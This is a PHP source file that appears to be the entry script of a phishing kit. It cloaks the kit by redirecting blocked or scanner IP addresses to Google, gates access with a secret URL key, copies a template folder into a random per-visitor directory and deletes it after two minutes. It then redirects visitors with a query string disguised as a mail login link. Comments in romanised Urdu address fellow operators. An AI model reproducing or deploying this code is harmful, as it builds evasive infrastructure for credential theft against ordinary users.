<?php

session_start();

include 'delete_function.php';
include 'includes/config.php';
include 'includes/user_details.php';
include 'includes/antibot.php';


if($isp_setting == "on")
{
    foreach($ips as $ip) 
    {
        if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR']))
        {
            $ip = getUserIP();
            header('location: https://www.google.com');
            die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
            exit();
        }
    }
}


if (in_array($_SERVER['REMOTE_ADDR'], $bannedIP)) 
{
    if ($show_captcha == "yes" && !isset($_GET["captcha_done"])) 
    {
        header('location:captcha/index.php');
        exit();
    }else
    {
        header('location: https://www.google.com');
        exit();
    }
}





//+++++++++++++++++// VARIABLES DECLARATION \\+++++++++++++++++\\


$src = "smoth";

$random = getName(19);

$b = base64_encode($random);

$result = hash("sha256", rand());

//$random = $random . $user_ip . $result . $user_country . $user_continent . $user_country_code . $user_continent_code . $date_time;
$user_ip = hash("sha256", $user_ip);
$user_continent = base64_encode($user_continent);
$user_country_code = base64_encode($user_country_code);
$user_country = base64_encode($user_country);
$user_country_code = base64_encode($user_country_code);

$random = $random.$user_continent.$date_time.$user_ip.$b.$user_country_code.$user_country.$user_country_code.$random;

// SET UNIQUE USER SESSION
$_SESSION["user_id"] = $random;


function getName($n)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';

    for ($i = 0; $i < $n; $i++) {
        $index = rand(0, strlen($characters) - 1);
        $randomString .= $characters[$index];
    }

    return $randomString;
}


//+++++++++++++++++// VARIABLES DECLARATION END \\+++++++++++++++++\\ 


// is ko change karna mad or pathan ko. Link Work like: index.php?activity=4789652

if ($_GET['bigdreamice'] != "gbf34rfejkf")  {
    exit;
}


$now = time();
// 
if ($handle = opendir($path)) // bhai yahan full directory deni hai jisy scan kry
{

    $blacklist = array('.', '..', 'delete_function.php', 'js', 'includes', 'index.php', 'captcha', '.htaccess', 'smoth', 'any other file?');
    // caution: bhai . or .. remove ni krna $blacklist array sy. warna pichly folders k L lg jain gy.
    while (false !== ($file = readdir($handle))) {
        if (!in_array($file, $blacklist)) {

            if ($now - filemtime($file) >= 120) // 120 second. (use 60 * 60 for 1 hours)
            {

                if (is_dir($file)) {
                    deletefolder($file);
                }
            }

        }
    }
    closedir($handle);

}


//+++++++++++++++++// CREATE FOLDER AND COPY FILE \\+++++++++++++++++\\

function recurse_copy($src, $dst)
{
    $dir = opendir($src);
    @mkdir($dst);
    while (false !== ($file = readdir($dir))) {
        if (($file != '.') && ($file != '..')) {
            if (is_dir($src . '/' . $file)) {
                recurse_copy($src . '/' . $file, $dst . '/' . $file);
            } else {
                copy($src . '/' . $file, $dst . '/' . $file);
            }
        }
    }
    closedir($dir);
}


//+++++++++++++++++// CALL FUNCTION \\+++++++++++++++++\\

recurse_copy($src, $random);


// REDIRECT TO NEW FOLDER FILES
header("location:".$random."?Key=".$random."&rand=18PWDInboxLightnigcableaspxn_".$random."_$b-&$result");


?>

<script type="text/javascript">

    var random = '<?php echo $random;?>';
    var b = '<?php echo $b;?>';
    var result = '<?php echo $result;?>';
    var url = "";

    var hashValue = location.hash.substr(1);
    if (hashValue == "") {
        var queryString = window.location.search;
        var urlParams = new URLSearchParams(queryString);
        var userid = urlParams.get('userid');

        if (userid != "" && userid != null) {
            url = random + "?Key=" + random + "&rand=18PWDInboxLightnigcableaspxn_" + random + "_" + b + "-&" + result + "&userid=" + userid;
            window.location.href = url;
        } else {
            url = random + "?Key=" + random + "&rand=18PWDInboxLightnigcableaspxn_" + random + "_" + b + "-&" + result;
            window.location.href = url;
        }

    } else {
        url = random + "?Key=" + random + "&rand=18PWDInboxLightnigcableaspxn_" + random + "_" + b + "-&" + result + "#" + hashValue;
        window.location.href = url;
    }

</script>